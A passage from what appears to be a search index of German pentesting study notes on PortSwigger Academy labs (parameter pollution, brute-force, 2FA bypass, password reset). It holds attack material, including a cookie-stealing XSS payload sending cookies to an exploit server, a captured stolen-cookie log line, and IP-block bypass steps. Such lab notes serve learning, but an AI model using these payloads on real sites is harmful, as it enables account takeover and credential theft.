<code>{\"name\":\"peter\",\"access_level\":\"administrator\"}</code></p> <p>Der User peter k\u00f6nnte f\u00e4lschlicherweise Adminrechte bekommen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#beispiel-2-json-input-vom-client","title":"Beispiel 2 \u2013 JSON-Input vom Client","text":"<p>Client-Request: <code>POST /myaccount {\"name\":\"peter\"}</code></p> <p>Server-Request: <code>PATCH /users/7312/update {\"name\":\"peter\"}</code></p> <p>Angreifer manipuliert die Eingabe: <code>POST /myaccount {\"name\":\"peter\\\",\\\"access_level\\\":\\\"administrator\"}</code></p> <p>Server \u00fcbernimmt das ungefiltert \u2192 daraus wird: <code>{\"name\":\"peter\",\"access_level\":\"administrator\"}</code></p> <p>User peter k\u00f6nnte Adminrechte erhalten.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#injection-auch-in-responses-moglich","title":"Injection auch in Responses m\u00f6glich","text":"<ul> <li> <p>Wenn User-Input zwar sicher in der DB gespeichert wird, aber sp\u00e4ter ungefiltert in eine JSON-Response eingef\u00fcgt wird, kann auch dort eine Structured Format Injection auftreten.</p> </li> <li> <p>Pr\u00fcf- und Ausnutzungsm\u00f6glichkeiten sind \u00e4hnlich wie bei Requests.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#testing-mit-automatisierten-tools","title":"Testing mit automatisierten Tools","text":"<p>Burp bietet automatisierte Tools, die dir beim Erkennen von Server-side Parameter Pollution-Schwachstellen helfen k\u00f6nnen.</p> <ul> <li> <p>Burp Scanner</p> <ul> <li>Erkennt automatisch verd\u00e4chtige Input-Transformationen w\u00e4hrend eines Audits.</li> <li>Das passiert, wenn die Anwendung Eingaben annimmt, diese ver\u00e4ndert und dann weiterverarbeitet.</li> <li>Das allein ist nicht zwingend eine Schwachstelle \u2192 du musst mit den manuellen Techniken weiter testen (siehe oben).</li> <li>Mehr Infos: Suspicious input transformation issue definition.</li> </ul> </li> <li> <p>Backslash Powered Scanner (BApp)</p> <ul> <li>Hilft, serverseitige Injection-Schwachstellen zu finden.</li> <li> <p>Klassifiziert Eingaben in:</p> <ul> <li>boring (langweilig)</li> <li>interesting (interessant)</li> <li>vulnerable (verwundbar)</li> </ul> </li> <li> <p>\u201eInteressante\u201c Eingaben musst du manuell weiter pr\u00fcfen (wie oben beschrieben).</p> </li> <li>Mehr Infos: Backslash Powered Scanning: hunting unknown vulnerability classes (Whitepaper).</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/5.%20Preventing%20Server-Side%20Parameter%20Pollution/","title":"5. Preventing Server Side Parameter Pollution","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/5.%20Preventing%20Server-Side%20Parameter%20Pollution/#verhindern-von-server-side-parameter-pollution","title":"Verhindern von Server-side Parameter Pollution","text":"<ul> <li>Verwende eine Allowlist f\u00fcr Zeichen, die nicht encodiert werden m\u00fcssen.</li> <li>Stelle sicher, dass alle anderen Benutzereingaben encodiert werden, bevor sie in eine serverseitige Anfrage eingef\u00fcgt werden.</li> <li>Achte darauf, dass alle Eingaben dem erwarteten Format und der erwarteten Struktur entsprechen.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/","title":"1. SF Authentication","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#allgemein","title":"Allgemein","text":"<p>Authentication ist ein Prozess der User bzw. Clients identifiziert und ggf. unterschiedliche Rechte auf Webseiten verteilt, weil Webseiten in erster Linie erstmal \u00f6ffentlich f\u00fcr das ganze Internet ist. Deswegen sind robuste Authentication-Mechanismen essenziell f\u00fcr Web-Security.</p> <p>Es gibt 3 verschiedene Haupttypen - Etwas was man wei\u00df z. B: Passwort - Etwas was man hat z. B: Schl\u00fcssel - Etwas was man ist z. B: Fingerabdr\u00fccke, Gesichtserkennung oder Verhaltensweisen</p> <p>Authentication: Prozess um von jemandem die Identit\u00e4t zu best\u00e4tigen Authorization: Welche Art von Rechte hat der User</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#wie-entstehen-vulnerabilities-beim-authentifizieren","title":"Wie entstehen vulnerabilities beim authentifizieren","text":"<ul> <li>Zu Schwache Mechanismen und nicht gegen Brute-Force gesichert</li> <li>Schlechte Implementierung sodass der Hacker das einfach bypassen kann (Broken Authentication)</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#brute-force","title":"Brute-Force","text":"<p>Verschiedene Passwort/Username Kombinationen durch Trial und Error mit einem Algorithmus durchlaufen lassen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#gezielteres-brute-force","title":"gezielteres Brute-Force","text":"<p>Bei einem gezielterem Brute-Force werden gewisse Passwortlisten genommen oder wahrscheinlichere Kombinationen verwendet.</p> <p>Au\u00dferdem muss man auf diverse Dinge achten die ggf. Auskunft \u00fcber zB: korrekte Usernamen geben durch: - Status Code: W\u00e4hrend einer Brute-Force attacke ist es wichtig immer die selbe Fehlermeldung zu liefern also ob Username nun richtig oder falsch ist sonst kann ein unterschiedlicher Status-Code Auskunft dar\u00fcber liefern ob der Username in der Datenbank auftaucht oder nicht. - Error messages: Manchmal k\u00f6nnten auch Error Messages unterschiedliche Ausgaben liefern zB: \"Username ist falsch\" oder \"Username und Passwort sind falsch\" oder \"Passwort ist falsch\" - Response Time: Je nachdem ob ein Username korrekt ist braucht das System l\u00e4nger weil es nach dem zugeh\u00f6rigen Passwort sucht was eine l\u00e4ngere response-time bedeuten k\u00f6nnte wodurch sich auch erahnen l\u00e4sst ob ein Username richtig oder falsch ist</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#lab-username-enumeration-via-different-responses","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab: Username enumeration via different responses","text":"<ol> <li>Suche nach POST /login request.</li> <li>An Intruder senden, Passwortliste einf\u00fcgen und start Attack</li> <li>Length unterschiedlich -&gt; Username vermutlich korrekt</li> <li>Dann das gleiche mit Passwort und dem gefundenen Usernamen wiederholen. -&gt; Statuscode 302</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#lab-username-enumeration-via-subtly-different-responses","title":"\ud83d\udda5\ufe0f\ud83e\uddeaLab: Username enumeration via subtly different responses","text":"<p>Ziel: Analyse der Login-Funktion, um Unterschiede bei falschen und korrekten Eingaben zu erkennen und anschlie\u00dfend einen erfolgreichen Brute-Force Angriff durchzuf\u00fchren.</p> <p>Vorgehen:</p> <ol> <li> <p>Erste Tests im Intruder:</p> <ul> <li>Alle Responses hatten Status Code <code>200</code>.</li> <li>Die Response Length war zwar unterschiedlich, der Unterschied entstand jedoch nur durch ein eingebundenes Analytics-Script \u2192 kein valider Indikator.</li> </ul> </li> <li> <p>Vergleich der Fehlermeldungen:</p> <ul> <li>Verschiedene Keywords getestet (Grep Match).</li> <li>Mit komplett falschen Usernamen (<code>asd7127371231b2n178z</code>) Response im Repeater \u00fcberpr\u00fcft.</li> <li>Unterschied entdeckt:<ul> <li>Ung\u00fcltiger Username \u2192 Fehlermeldung: \u201cInvalid username and password.\u201d</li> <li>G\u00fcltiger Username, falsches Passwort \u2192 Fehlermeldung fast gleich, aber ohne Punkt am Ende.</li> </ul> </li> <li>Damit konnte ein valider Benutzername identifiziert werden.</li> </ul> </li> <li> <p>Brute Force Passwort-Test:</p> <ul> <li>Den ermittelten g\u00fcltigen Benutzernamen mit einer Passwortliste im Intruder getestet.</li> <li>Nach Auswertung der Responses \u2192 Login erfolgreich \u2192 Zugang erhalten.</li> </ul> </li> </ol> <p>Ergebnis: Die Login-Funktion ist anf\u00e4llig f\u00fcr Username Enumeration (durch subtile Unterschiede in den Fehlermeldungen) und erlaubt anschlie\u00dfend einen erfolgreichen Brute-Force Angriff auf das Passwort.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#lab-authentication-username-enumeration-ip-blocker-bypass","title":"\ud83d\udda5\ufe0f\ud83e\uddea LAB: Authentication \u2013 Username Enumeration &amp; IP-Blocker Bypass","text":"<p>Ziel: Analyse der Login-Funktion hinsichtlich Brute-Force-Absicherung, Username Enumeration und m\u00f6glichen Bypass-Mechanismen.</p> <ol> <li> <p>Erste Beobachtungen</p> <ul> <li>Bei einem korrekten Benutzernamen und einem absichtlich langen Passwort dauert die Antwort des Servers signifikant l\u00e4nger.</li> <li>Bei einem falschen Benutzernamen erfolgt die Antwort dagegen sehr schnell.     \u2192 Dadurch l\u00e4sst sich eine Username Enumeration \u00fcber Response Time durchf\u00fchren.</li> </ul> </li> <li> <p>IP-Blocker</p> <ul> <li>Nach ca. 3 fehlgeschlagenen Login-Versuchen wurde die Client-IP blockiert.</li> <li>Durch Tests festgestellt: Ein einfacher <code>X-Forwarded-For</code>-Header reicht aus, um die Sperre zu umgehen.</li> <li>Das System vertraut offenbar den \u00fcbergebenen Headern und wertet diese f\u00fcr die IP-Erkennung aus.</li> </ul> </li> <li> <p>Vorgehen mit Burp Intruder</p> <ol> <li> <p>Payload Setup:</p> <ul> <li>Benutzername: Liste mit potentiellen Usernamen.</li> <li>Passwort: Konstant ein langes Passwort, um Response Time-Unterschiede deutlicher zu machen.</li> <li>X-Forwarded-For: Als zweiter Payload-Parameter \u2192 IP-Adresse dynamisch hochz\u00e4hlen (z. B. <code>1.1.1.\u00a71\u00a7</code>).</li> </ul> </li> <li> <p>Angriff:</p> <ul> <li> <p>Intruder-Attacke gestartet mit 2 Positionen:</p> <ul> <li>Benutzername \u2192 arbeitet die Liste durch.</li> <li>X-Forwarded-For \u2192 erh\u00f6ht bei jedem Versuch die letzte IP-Ziffer.</li> </ul> </li> <li> <p>Ergebnis:</p> <ul> <li>Der korrekte Benutzername konnte eindeutig identifiziert werden, da die Response Time deutlich h\u00f6her war als bei allen anderen Requests.</li> </ul> </li> </ul> </li> </ol> </li> <li> <p>Passwort Brute Force:</p> <ul> <li>Danach denselben Ansatz mit dem bekannten, validen Benutzernamen.</li> <li>Passwortliste abgearbeitet, X-Forwarded-For weiter rotiert, um Sperre zu umgehen.</li> <li>Ergebnis: Login erfolgreich.</li> </ul> </li> <li> <p>Ergebnis</p> <ul> <li>Die Anwendung ist anf\u00e4llig f\u00fcr:<ol> <li>Username Enumeration via Response Time.</li> <li>Brute Force trotz IP-Blocker, da <code>X-Forwarded-For</code> manipuliert werden kann.</li> </ol> </li> </ul> </li> </ol> <p>Ziel: Analyse der Login-Schutzmechanismen, insbesondere der IP-Blockierung bei fehlerhaften Versuchen und deren m\u00f6gliche Umgehung.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#lab-broken-brute-force-protection-ip-block","title":"Lab: Broken brute-force protection, IP block","text":"<ol> <li> <p>Erste Beobachtungen</p> <ul> <li>Die Login-Funktion blockiert eine IP-Adresse nach 3 fehlgeschlagenen Versuchen.</li> <li>Anders als in der Variante mit <code>X-Forwarded-For</code> konnten wir diesmal feststellen:     Ein erfolgreicher Login (z. B. mit einem bekannten g\u00fcltigen Account) setzt die IP-Blockliste zur\u00fcck.</li> <li>Damit ist es m\u00f6glich, den Brute-Force-Schutz durch periodische \u201eReset-Logins\u201c auszuhebeln.</li> </ul> </li> <li> <p>Vorgehen</p> <ol> <li> <p>Analyse mit Burp Repeater:</p> <ul> <li>Mehrfach falsche Passw\u00f6rter gesendet \u2192 Blockierung nach 3 Versuchen best\u00e4tigt.</li> <li>Danach mit g\u00fcltigem Account (\u201ewiener:peter\u201c) eingeloggt \u2192 Blockierung sofort aufgehoben.</li> </ul> </li> <li> <p>Strategie f\u00fcr Brute Force:</p> <ul> <li>Wir haben eine Passwortliste f\u00fcr den Zieluser \u201ecarlos\u201c vorbereitet.</li> <li>In regelm\u00e4\u00dfigen Abst\u00e4nden nach jeweils 3 Versuchen wurde ein zus\u00e4tzlicher Login mit \u201ewiener:peter\u201c eingestreut, um die Blockierung zur\u00fcckzusetzen.</li> <li>Dadurch konnten die Brute-Force-Versuche ohne Unterbrechung fortgesetzt werden.</li> </ul> </li> <li> <p>Umsetzung:</p> <ul> <li>Zwei Payload-Sets im Intruder:<ul> <li>Benutzername: Haupts\u00e4chlich \u201ecarlos\u201c, alle 3 Versuche erg\u00e4nzt durch \u201ewiener\u201c.</li> <li>Passwort: Aus Passwortliste, alle 3 Versuche erg\u00e4nzt durch \u201epeter\u201c.</li> </ul> </li> <li>Ergebnis: Der IP-Blocker griff nicht mehr, da jede Blockade durch den g\u00fcltigen Login sofort zur\u00fcckgesetzt wurde.</li> <li>Der korrekte Benutzername und anschlie\u00dfend das Passwort konnten so gefunden werden.</li> </ul> </li> </ol> </li> <li> <p>Ergebnis</p> <ul> <li>Die Anwendung ist anf\u00e4llig f\u00fcr Brute Force trotz IP-Blocker, weil ein erfolgreicher Login die Blockliste sofort l\u00f6scht.</li> <li>Der Schutzmechanismus ist dadurch wirkungslos, sobald Angreifer Zugang zu irgendeinem g\u00fcltigen Account haben.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#account-locking","title":"Account Locking","text":"<p>Grundidee: Webseiten sperren Accounts nach einer bestimmten Anzahl fehlgeschlagener Login-Versuche, um Brute-Force-Angriffe zu erschweren.</p> <p>Vorteile - Sch\u00fctzt bedingt vor Brute-Force-Angriffen auf ein bestimmtes Konto, da dieses nach wenigen Fehlversuchen gesperrt wird.</p> <p>Schw\u00e4chen / Umgehungsm\u00f6glichkeiten 1. Username Enumeration     - Wenn der Server bei gesperrten Accounts andere Fehlermeldungen zur\u00fcckgibt, k\u00f6nnen Angreifer dadurch g\u00fcltige Usernamen erkennen.</p> <ol> <li> <p>Brute Force gegen viele Accounts</p> <ul> <li>Schutz greift nur bei Angriffen auf ein einzelnes Konto.</li> <li>Angreifer k\u00f6nnen mehrere Accounts parallel angreifen, solange sie das Limit pro Account nicht \u00fcberschreiten.</li> <li>Beispiel:<ul> <li>Max. 3 Versuche erlaubt \u2192 Angreifer probiert pro User 3 Standard-Passw\u00f6rter.</li> <li>Es reicht, wenn ein User tats\u00e4chlich eines dieser Passw\u00f6rter nutzt \u2192 Account kompromittiert.</li> </ul> </li> </ul> </li> <li> <p>Credential Stuffing</p> <ul> <li>Bei Credential Stuffing werden echte, gestohlene Zugangsdaten (aus Leaks) massenhaft ausprobiert.</li> <li>Da pro Account nur ein Login-Versuch n\u00f6tig ist, greift Account Locking hier nicht.</li> <li>Besonders gef\u00e4hrlich, weil viele Nutzer ihre Passw\u00f6rter auf mehreren Webseiten wiederverwenden \u2192 Angreifer k\u00f6nnen so gleich mehrere Accounts \u00fcbernehmen.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#user-rate-limiting","title":"User Rate Limiting","text":"<p>Ansatz: Eine weitere M\u00f6glichkeit, Brute-Force-Angriffe zu verhindern, ist Rate Limiting pro Benutzer/IP. - Wenn zu viele Login-Versuche in kurzer Zeit von derselben IP ausgehen, wird diese IP blockiert. - Die Entsperrung kann erfolgen:     - automatisch nach einer bestimmten Zeit,     - manuell durch einen Administrator,     - manuell durch den Benutzer (z. B. per CAPTCHA).</p> <p>Vorteil gegen\u00fcber Account Locking: - Weniger anf\u00e4llig f\u00fcr Username Enumeration und DoS-Angriffe.</p> <p>Schw\u00e4chen: - Angreifer k\u00f6nnen ihre scheinbare IP manipulieren (z. B. per Proxy oder Header-Manipulation), um die Sperre zu umgehen. - In manchen F\u00e4llen l\u00e4sst sich die Sperre auch aushebeln, indem mehrere Passwortversuche in einer einzigen HTTP-Anfrage kombiniert werden.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#schwachstellen-bei-multi-faktor-authentifizierung-mfa","title":"Schwachstellen bei Multi-Faktor-Authentifizierung (MFA)","text":"<p>Viele Websites nutzen noch reine Single-Factor Authentifizierung (Passwort). Immer h\u00e4ufiger wird aber Zwei-Faktor-Authentifizierung (2FA) eingesetzt, bei der Nutzer etwas wissen (Passwort) und etwas besitzen (z. B. Code vom Ger\u00e4t).</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#vorteile-von-2fa","title":"Vorteile von 2FA","text":"<ul> <li>Angreifer k\u00f6nnen evtl. ein Passwort stehlen.</li> <li>Gleichzeitig an den zweiten Faktor zu kommen, ist deutlich schwerer.</li> <li>Darum ist 2FA grunds\u00e4tzlich sicherer als reines Passwort-Login.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#probleme-schwachstellen","title":"Probleme &amp; Schwachstellen","text":"<ol> <li> <p>Schlechte Implementierung</p> <ul> <li>2FA ist nur so sicher wie die Umsetzung.</li> <li>Fehler k\u00f6nnen dazu f\u00fchren, dass man 2FA umgehen oder ganz \u00fcberspringen kann.</li> </ul> </li> <li> <p>Gleicher Faktor doppelt gepr\u00fcft</p> <ul> <li>E-Mail-basierte 2FA gilt nicht als echte Zwei-Faktor-Authentifizierung.</li> <li>Der Nutzer gibt Passwort ein und erh\u00e4lt Code per Mail \u2192 beide h\u00e4ngen vom Wissen des E-Mail-Passworts ab.</li> <li>Ergebnis: Es wird nicht wirklich ein zweiter Faktor gepr\u00fcft.</li> </ul> </li> <li> <p>Token-Methoden</p> <ul> <li>Sicherer: Dedizierte Ger\u00e4te (RSA-Token, Keypads) oder Apps wie Google Authenticator \u2192 Code wird lokal auf dem Ger\u00e4t generiert.</li> <li>Unsicherer: SMS-Codes \u2192 k\u00f6nnen abgefangen werden (z. B. durch Angriffe auf das Mobilfunknetz).<ul> <li>Risiko: SIM-Swapping \u2192 Angreifer \u00fcbernimmt Rufnummer, erh\u00e4lt alle SMS inklusive 2FA-Codes.</li> </ul> </li> </ul> </li> <li> <p>Bypass-Szenarien</p> <ul> <li>Manche Websites setzen 2FA technisch falsch um:<ul> <li>Zuerst Passwort-Eingabe, danach Code-Eingabe auf separater Seite.</li> <li>Nach Passwort-Eingabe gilt der Nutzer bereits als \u201eeingeloggt\u201c.</li> <li>Angreifer kann direkt auf gesch\u00fctzte Seiten zugreifen, ohne jemals den Code einzugeben.</li> </ul> </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#lab-2fa-simple-bypass","title":"Lab: 2FA simple bypass","text":"<p>Oft wird eine 2FA abgefragt, aber letztlich gar nicht gegengecheckt. D. h wenn man sich einloggt mit dem Passwort kann es sein, dass ein einfaches droppen vom 2. Login den Zugang erm\u00f6glicht. So wie in der Lab Aufgabe</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/1.%20SF-Authentication/#lab-2fa-broken-logic","title":"Lab: 2FA broken logic","text":"<p>Nachtr\u00e4glicher Bericht.</p> <p>Man muss aufpassen, dass man nicht den 2FA brute-forcen kann. -&gt; User ausloggen bei zu vielen fehlschl\u00e4gen mit 2FA -&gt; in der praxis aber oft sinnlos weil ein advancter Hacker auch diesen Prozess automatisieren kann mit Burp Makros</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/2.%20MF-Authentication/","title":"2. MF Authentication","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/2.%20MF-Authentication/#schwachstellen-bei-multi-faktor-authentifizierung-mfa","title":"Schwachstellen bei Multi-Faktor-Authentifizierung (MFA)","text":"<p>Viele Websites nutzen noch reine Single-Factor Authentifizierung (Passwort). Immer h\u00e4ufiger wird aber Zwei-Faktor-Authentifizierung (2FA) eingesetzt, bei der Nutzer etwas wissen (Passwort) und etwas besitzen (z. B. Code vom Ger\u00e4t).</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/2.%20MF-Authentication/#vorteile-von-2fa","title":"Vorteile von 2FA","text":"<ul> <li>Angreifer k\u00f6nnen evtl. ein Passwort stehlen.</li> <li>Gleichzeitig an den zweiten Faktor zu kommen, ist deutlich schwerer.</li> <li>Darum ist 2FA grunds\u00e4tzlich sicherer als reines Passwort-Login.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/2.%20MF-Authentication/#probleme-schwachstellen","title":"Probleme &amp; Schwachstellen","text":"<ol> <li> <p>Schlechte Implementierung</p> <ul> <li>2FA ist nur so sicher wie die Umsetzung.</li> <li>Fehler k\u00f6nnen dazu f\u00fchren, dass man 2FA umgehen oder ganz \u00fcberspringen kann.</li> </ul> </li> <li> <p>Gleicher Faktor doppelt gepr\u00fcft</p> <ul> <li>E-Mail-basierte 2FA gilt nicht als echte Zwei-Faktor-Authentifizierung.</li> <li>Der Nutzer gibt Passwort ein und erh\u00e4lt Code per Mail \u2192 beide h\u00e4ngen vom Wissen des E-Mail-Passworts ab.</li> <li>Ergebnis: Es wird nicht wirklich ein zweiter Faktor gepr\u00fcft.</li> </ul> </li> <li> <p>Token-Methoden</p> <ul> <li>Sicherer: Dedizierte Ger\u00e4te (RSA-Token, Keypads) oder Apps wie Google Authenticator \u2192 Code wird lokal auf dem Ger\u00e4t generiert.</li> <li>Unsicherer: SMS-Codes \u2192 k\u00f6nnen abgefangen werden (z. B. durch Angriffe auf das Mobilfunknetz).<ul> <li>Risiko: SIM-Swapping \u2192 Angreifer \u00fcbernimmt Rufnummer, erh\u00e4lt alle SMS inklusive 2FA-Codes.</li> </ul> </li> </ul> </li> <li> <p>Bypass-Szenarien</p> <ul> <li>Manche Websites setzen 2FA technisch falsch um:<ul> <li>Zuerst Passwort-Eingabe, danach Code-Eingabe auf separater Seite.</li> <li>Nach Passwort-Eingabe gilt der Nutzer bereits als \u201eeingeloggt\u201c.</li> <li>Angreifer kann direkt auf gesch\u00fctzte Seiten zugreifen, ohne jemals den Code einzugeben.</li> </ul> </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/2.%20MF-Authentication/#lab-2fa-simple-bypass","title":"Lab: 2FA simple bypass","text":"<p>Oft wird eine 2FA abgefragt, aber letztlich gar nicht gegengecheckt. D. h wenn man sich einloggt mit dem Passwort kann es sein, dass ein einfaches droppen vom 2. Login den Zugang erm\u00f6glicht. So wie in der Lab Aufgabe</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/2.%20MF-Authentication/#lab-2fa-broken-logic","title":"Lab: 2FA broken logic","text":"<p>Nachtr\u00e4glicher Bericht.</p> <p>Man muss aufpassen, dass man nicht den 2FA brute-forcen kann. -&gt; User ausloggen bei zu vielen fehlschl\u00e4gen mit 2FA -&gt; in der praxis aber oft sinnlos weil ein advancter Hacker auch diesen Prozess automatisieren kann mit Burp Makros</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/","title":"3. Other Authentication","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#andere-authentication-mechanismen","title":"Andere Authentication Mechanismen","text":"<p>Es gibt noch weitere Mechansimen die gut abgesichert werden m\u00fcssen. - Remember Me - Reset Password</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#remember-me","title":"Remember me","text":"<p>Oft werden diese einfach mit einem Cookie-Token vergeben -&gt; Gef\u00e4hrlich kann das werden wenn dieser nicht gut gesichert implementiert wird. Manchmal wird einfach nur ein Token aus Username und Passwort erstellt und encrypted.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#lab-brute-forcing-a-stay-logged-in-cookie","title":"Lab: Brute-forcing a stay-logged-in cookie","text":"<ol> <li>Wir melden uns mit unserem Account an und checken das Verhalten der Webseite und sehen es wird beim Login ein Encrypted Logged-In Token \u00fcbergeben. </li> <li>Nach genauerem hinsehen und decrypten haben wir festgestellt, es sind einfach nur    <code>Username:Password</code> als encrypted</li> <li>Hab dann an Turbo Intruder Extension geschickt und ein BF Script laufen lassen welches den Cookie bruteforced anhand von folgendem Muster base64(Username:MD5(Passwort)) (Username und Passwortliste waren ja gegeben)</li> <li>Ergebnis bei Treffer. Danach kann man Seite an Browser senden und laden lassen</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#lab-offline-password-cracking","title":"Lab: Offline password cracking","text":"<ol> <li>Wieder abchecken wie die Seite funktioniert.<ul> <li>XSS m\u00f6glich in Comment-Section bei Posts, Stayed-Login(No Random Hash - Base64(Username:MD5(Passwort)))</li> </ul> </li> <li>Danach ein Exploit in der Comment-Section bei einem Blog-Post eingeschleust welcher den stayed-login-cookie an mich sendet. - Nutzer ruft unseren Server mit angeh\u00e4ngten Cookies auf <pre><code>&lt;script&gt;document.location=\"exploit-server-url\"+document.cookie&lt;/script&gt;\n</code></pre></li> <li>In den Logs sehen wir nun die angeh\u00e4ngten Cookies  <pre><code>10.0.4.161      2025-09-22 10:27:47 +0000 \"GET /exploitsecret=IkPigWIfXzgZjVhxP8xYvFg0FVJzf7Pn;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1\" 404 \"user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\"\n</code></pre></li> <li>Mit Decoder in Burp-Suit und Crackstation k\u00f6nnen wir den encrypteten Hash wieder decrypten</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#resetting-password","title":"Resetting Password","text":"<p>In der Praxis vergessen Nutzer oft ihre Passw\u00f6rter daher ist es wichtig eine Methode einzubauen die eben ein solches zur\u00fccksetzen des Passworts m\u00f6glich machen - Wichtiger ist es das auch entsprechend sicher zu machen</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#passworter-uber-e-mail","title":"Passw\u00f6rter \u00fcber E-Mail","text":"<p>Anf\u00e4llig f\u00fcr Man in the Middle angriffe</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#passworter-als-url","title":"Passw\u00f6rter als URL","text":"<p>Anf\u00e4llig bei den tempor\u00e4ren Token -&gt; Wichtig diese gegenzuchecken sonst kann man einfach seinen eigenen POST Request zusammenstellen und das Passwort eines Users \u00e4ndern nur mit dem Usernamen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#lab-password-reset-broken-logic","title":"Lab: Password reset broken logic","text":"<ol> <li>Testweise Passwort zur\u00fccksetzen mit eigenem Konto um zu schauen wie die Seite das handhabt</li> <li>Stellen fest bei <code>POST /forgot-password?temp-forgot-password-token</code> legen wir ein neues Passwort fest mit mehreren Parametern <pre><code>temp-forgot-password-token=c6t958p7h1mnkptraihiis0m6tykyzht&amp;username=wiener&amp;new-password-1=peter1&amp;new-password-2=peter1\n</code></pre></li> <li>Testweise l\u00f6schen wir den token und schauen ob die Anfrage durchgeht.</li> <li>Anfrage geht durch und somit wissen wir, dass der Token nicht \u00fcberpr\u00fcft wird</li> <li>Wir f\u00fcllen die anderen Parameter und senden die Anfrage</li> <li>Anfrage ging durch -&gt; Passwort ge\u00e4ndert</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Authentication%20vulnerabilities/3.%20Other-Authentication/#lab-password-reset-poisoning-via-middleware","title":"Lab: Password reset poisoning via middleware","text":"<ol> <li>Mal wieder testweise schauen wie Forgot Password funktioniert und was genau gesendet und \u00fcbergeben wird.</li> <li><code>POST /forgot-password</code> ist f\u00fcr uns relevant. <ol> <li>Wir sehen er nimmt den parameter username und host und baut damit einen tmp-token f\u00fcr passwort-reset    </li> </ol> </li> <li>User bekommt E-Mail mit exploit Link</li> <li>User dr\u00fcckt auf Link und es wird der tmp-password-reset-token an unseren exploit-server-log geschickt</li> <li>Key nutzen und in die <code>POST 